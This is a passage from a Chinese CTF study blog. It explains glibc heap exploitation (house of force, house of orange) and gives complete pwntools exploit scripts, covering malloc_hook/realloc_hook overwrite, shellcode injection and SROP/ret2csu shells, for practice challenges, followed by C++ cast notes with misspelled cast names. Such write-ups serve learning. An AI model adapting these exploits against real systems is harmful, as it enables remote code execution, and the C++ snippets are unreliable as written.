orange</code>和<code>house of force</code>，回头还要把<code>house</code>系列重学一遍</p><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>适用<code>libc</code>版本:<code>2.23</code> <code>2.27</code></p><p>使用前提:</p><p>1、申请堆块的大小不受限制</p><p>2、能够篡改<code>top chunk</code>的<code>size</code>位</p><p>3、有<code>top chunk</code>原本的地址和目的地址</p><p>PS：有偏移可以不用具体地址</p><p>利用：改<code>top chunk size</code>为<code>-1</code>，申请堆块大小为<code>target - 0x20 - top chunk address</code>，可以将<code>top chunk</code>更新到<code>target</code>处，再次申请可以任意写<code>target</code>位置</p><h3 id="orangeforce"><a href="#orangeforce" class="headerlink" title="orangeforce"></a>orangeforce</h3><p><code>house of orange + house of force</code>，无<code>edit</code>和<code>delete</code>，限制创建堆块数量六个，可以溢出<code>8</code>字节，创建堆块之前还要先创建一个<code>character</code>才能去创建堆。</p><p>先利用<code>house of orange</code>缩小<code>top chunk</code>的大小，但要保证修改的大小加上<code>top chunk</code>的地址最后三位为<code>0</code>，再创建一个比<code>top chunk size</code>更大的堆使得<code>top chunk</code>被释放进<code>unsorted bin</code>，此时得到<code>libc</code>地址，最后申请一个堆获得堆地址</p><p>泄露完地址再利用<code>house of force</code>，改<code>top chunk size</code>为<code>-1</code>，再申请<code>target - top_chunk - 0x20</code>大小的堆，使得<code>top chunk</code>落在<code>target</code>，这里需要改<code>malloc_hook</code>，但是直接改<code>malloc_hook</code>为<code>ogg</code>不能打通，所以需要利用<code>realloc_hook</code>，即使<code>top chunk</code>落在<code>realloc_hook</code>，最后申请一个堆改<code>realloc_hook</code>为<code>ogg</code>、改<code>malloc_hook</code>为<code>realloc + 2</code></p><p>此时已经用掉了六个堆，还需要创建一次堆触发<code>ogg</code>，利用<code>scanf</code>输入很长一段字符串可以导致<code>scanf</code>内部扩展缓冲区，从而调用<code>init_malloc</code>来分配更大的空间导致<code>malloc_consolidate</code>的特性在<code>scanf</code>时输入很长的内容来<code>malloc</code>触发<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_c</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> STR<span class="token punctuation">,</span> DEF<span class="token punctuation">,</span> DEX<span class="token punctuation">,</span> ACC<span class="token punctuation">,</span> INT<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Name'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'STR'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>STR<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'DEF'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>DEF<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'DEX'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>DEX<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'ACC'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ACC<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'INT'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>INT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Power'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add_c<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xd81</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>realloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>realloc <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>top_chunk <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x21920</span>add<span class="token punctuation">(</span><span class="token number">0xb88</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xb88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>size <span class="token operator">=</span> realloc_hook <span class="token operator">-</span> top_chunk <span class="token operator">-</span> <span class="token number">0x20</span>add<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>realloc <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span> <span class="token operator">*</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><p><code>exec</code>函数可以执行<code>shellcode</code>，但要通过<code>isAdmin</code>的判断，所以要先通过<code>Login</code>改<code>isAdmin</code>为<code>1</code>，<code>Login</code>中的<code>password</code>为<code>SuperSecurePassword123!</code>，而要用<code>Login</code>首先要把<code>v5</code>改成<code>0</code>，所以通过<code>Send Message to Admin</code>功能溢出<code>v4</code>将<code>v5</code>覆盖成<code>0</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">56</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Password'</span><span class="token punctuation">,</span> <span class="token string">b'SuperSecurePassword123!\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Shellcode'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CISCN-2019华南-PWN3"><a href="#CISCN-2019华南-PWN3" class="headerlink" title="[CISCN_2019华南]PWN3"></a>[CISCN_2019华南]PWN3</h3><p>这题印象中以前写过，没有<code>pie</code>没有<code>canary</code>，一次读可以溢出，一次输出泄露地址，程序中有<code>mov rax, 0Fh</code>，第一反应就是<code>srop</code>，第一次读泄露栈地址，第二次读输入<code>/bin/sh</code>再利用<code>srop</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>sigreturn <span class="token operator">=</span> <span class="token number">0x4004DA</span>syscall <span class="token operator">=</span> <span class="token number">0x400517</span>vuln <span class="token operator">=</span> <span class="token number">0x4004F1</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>binsh <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x120</span>frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execveframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> binshframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还可以用<code>ret2csu</code>，泄露地址方式同上，再利用<code>csu</code>改寄存器，最后用<code>mov rax, 3Bh</code>打<code>execve</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>execve <span class="token operator">=</span> <span class="token number">0x4004E2</span>csu_end_addr <span class="token operator">=</span> <span class="token number">0x400596</span>csu_front_addr <span class="token operator">=</span> <span class="token number">0x400580</span>syscall <span class="token operator">=</span> <span class="token number">0x400517</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004005a3</span>vuln <span class="token operator">=</span> <span class="token number">0x4004F1</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x128</span>payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">*</span> <span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-10"><a href="#8-10" class="headerlink" title="#8.10"></a>#8.10</h2><p>重学了一下<code>c++</code>，明天把异常处理和命名空间看完再看看<code>c</code>的套接字编程</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>标准库（<code>standard library</code>）：提供<code>IO</code>机制，包括标准输入<code>cin</code>、标准输出<code>cout</code>、标准错误<code>cerr</code>、一般信息<code>clog</code></p><p><code>std::</code>：标准库的命名空间（<code>namespace</code>），指出名字是定义在<code>std</code>命名空间中的，避免名字冲突，其中<code>::</code>为作用域运算符</p><p><code>iostream</code>库：包含<code>istream</code>（输入流）和<code>ostream</code>（输出流），一个流就是一个字符序列，是从<code>IO</code>设备读出或写入<code>IO</code>设备的，随着时间的推移，字符是顺序生成或消耗的</p><p>操纵符（<code>endl</code>）：结束当前行，并将与设备关联的缓冲区（<code>buffer</code>）中的内容刷到设备中，保证到目前为止程序所产生的所有输出都真正写入输出流中，而不是仅停留在内存中等待写入流</p><p>文件重定向：将标准输入和标准输出与命名文件关联起来：<code>addItems outfile</code> ，加法程序已经编译为名为<code>addItems</code>的可执行文件，则上述命令会从一个名为<code>infile</code>的文件读取销售记录，并将输出结果写入到一个名为<code>outfile</code>的文件中</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>条件运算符：<code>cond?expr1:expr2;</code></p><p>读取数量不定的输入数据：<code>while（std::cin &gt;&gt; value）</code></p><p>类型别名：<code>typedef type1 type2;</code></p><p>显示转换：<code>cast-name&lt;type&gt;(expression);</code></p><p><code>cast-name</code>包括:</p><ul><li><p><code>static_cast</code>：任何具有明确定义的类型转换（除底层<code>const</code>）都可以使用，例如将较大算数类型赋值给较小类型，或找回存在于<code>void*</code>指针中的值</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void* p &#x3D; &amp;d;double *dp &#x3D; static_base&lt;double*&gt;(p);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>dynamic_case</code>：支持运行时类型识别</p></li><li><p><code>const_cast</code>：只能改变运算对象的底层<code>const</code>，将常量对象转换成非常量对象，一般称为去<code>const</code>性质,常用于有函数重载的上下文中</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">const char *cp;char *q &#x3D; static_case&lt;char*&gt;(cp);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="try语句块和异常处理"><a href="#try语句块和异常处理" class="headerlink" 